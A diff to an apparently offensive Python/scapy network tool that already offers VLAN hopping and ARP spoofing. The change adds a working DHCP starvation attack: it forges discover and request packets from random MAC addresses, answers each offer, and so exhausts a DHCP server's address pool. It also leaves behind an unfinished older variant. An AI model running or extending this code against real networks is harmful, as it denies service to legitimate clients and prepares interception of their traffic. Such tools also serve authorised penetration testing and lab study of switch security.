@@ -7,6 +7,7 @@ import argparse
 import os
 import threading
 import time
+import random
 from scapy.all import *
 from scapy.contrib.lldp import *
 from scapy.contrib.lacp import *
@@ -22,6 +23,9 @@ vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')
 
 arpspoof_parser = subparsers.add_parser('arpspoof',help='ARP Spoofing')
 
+dhcpstarvation_parser = subparsers.add_parser('dhcpstarvation',help='DHCP Starvation attack')
+
+
 main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
 main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")
 
@@ -33,6 +37,9 @@ flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Addre
 arpspoof_parser.add_argument("-t","--target",help="IP address of the target device whose traffic you wish to intercept.",required=True)
 arpspoof_parser.add_argument("-i","--impersonate",help="IP address of the device you want to impersonate to the target.",required=True)
 arpspoof_parser.add_argument("-f","--frequency",help="Frequency of ARP replies, default=0.5s",default=0.5)
+
+dhcpstarvation_parser.add_argument("-c","--count",help="Amount of DHCP requests, default=1000",default=1000,type=int)
+dhcpstarvation_parser.add_argument("-s","--dhcpserver",help="IP of DHCP Server, if known specified, retrieve")
 
 
 #vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
@@ -60,12 +67,89 @@ isl_link_flags = {
 event_LACP_Established = threading.Event()
 
 
+src_mac = ""
 
 # level 0 = standard output, level 1 = info, level 2 = debug
 def dprint(*args,level=0):
    if level <= main_args.verbose:
       print(' '.join(map(str, args)))
 
+def unicast_randMAC():
+   mac = RandMAC()
+   mac_list = mac.split(":")
+   first_byte = int(mac_list[0], 16) & 0xFE  # Clear the least significant bit
+   mac_list[0] = "{:02x}".format(first_byte)
+   return ":".join(mac_list)
+
+def mac_to_bin(mac_address):
+    return bytes(int(b, 16) for b in mac_address.split(':'))
+
+
+def handle_dhcp_packet(packet):
+    if DHCP in packet and packet[DHCP].options[0][1] == 2:  # DHCP Offer
+        offered_ip = packet[BOOTP].yiaddr
+        transcation_id = packet[BOOTP].xid
+        send_dhcp_request(offered_ip,transcation_id)
+
+def send_dhcp_discover():
+    dhcp_discover = (
+        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=random.randint(0, 0xFFFFFFFF)) /
+        DHCP(options=[("message-type", "discover"), "end"])
+    )
+    sendp(dhcp_discover)
+
+def send_dhcp_request(offered_ip,transaction_id):
+    dhcp_request = (
+        Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff") /
+        IP(src="0.0.0.0", dst="255.255.255.255") /
+        UDP(sport=68, dport=67) /
+        BOOTP(op=1, chaddr=mac_to_bin(src_mac) + b"\x00" * 10,xid=transaction_id) /
+        DHCP(options=[("message-type", "request"), 
+                      ("requested_addr", offered_ip),
+                      "end"])
+    )
+    sendp(dhcp_request)
+
+
+def dhcpstarvation():
+    global src_mac
+
+    print("Launching DHCP Server attack")
+    for i in range(main_args.count):
+
+       src_mac = unicast_randMAC()
+       send_dhcp_discover()
+       sniff(prn=handle_dhcp_packet, filter="udp and port 68", count=1, timeout=1)
+
+
+def dhcpstarvation_old(): 
+
+   if not (main_args.dhcpserver):
+      print("Define IP")
+      return
+
+   for i in range(main_args.count):
+      fakeMAC=RandMAC()
+      dhcp_request = (Ether(src=fakeMAC,dst="FF:FF:FF:FF:FF:FF")
+                     /IP(src="0.0.0.0",dst="255.255.255.255")
+                     /UDP(sport=68, dport=67)
+                     /BOOTP(chaddr=fakeMAC,xid=0x123456)
+                     /DHCP(options=[("message-type","request"),("client_id", b"\x01\x00\x11\x22\x33\x44\x55"),"end"]))
+      sendp(dhcp_request)
+
+   dhcp_discover = (
+   Ether(src="00:11:22:33:44:55", dst="ff:ff:ff:ff:ff:ff") /
+   IP(src="0.0.0.0", dst="255.255.255.255") /
+   UDP(sport=68, dport=67) /
+   BOOTP(op=1, chaddr=b"\x00\x11\x22\x33\x44\x55" + b"\x00" * 10, xid=0x1000) /
+   DHCP(options=[("message-type", "discover"), "end"])
+   )
+
+   # Send the DHCP discover packet
+   
 
 def fortilink_isl(lldp_keep_alive):
     print("Establishing FortiLink ISL...",end="",flush=True)
@@ -289,3 +373,6 @@ if action=="vlanhop":
 
 if action=="arpspoof":
    arpspoof()
+
+if action=="dhcpstarvation":
+   dhcpstarvation()
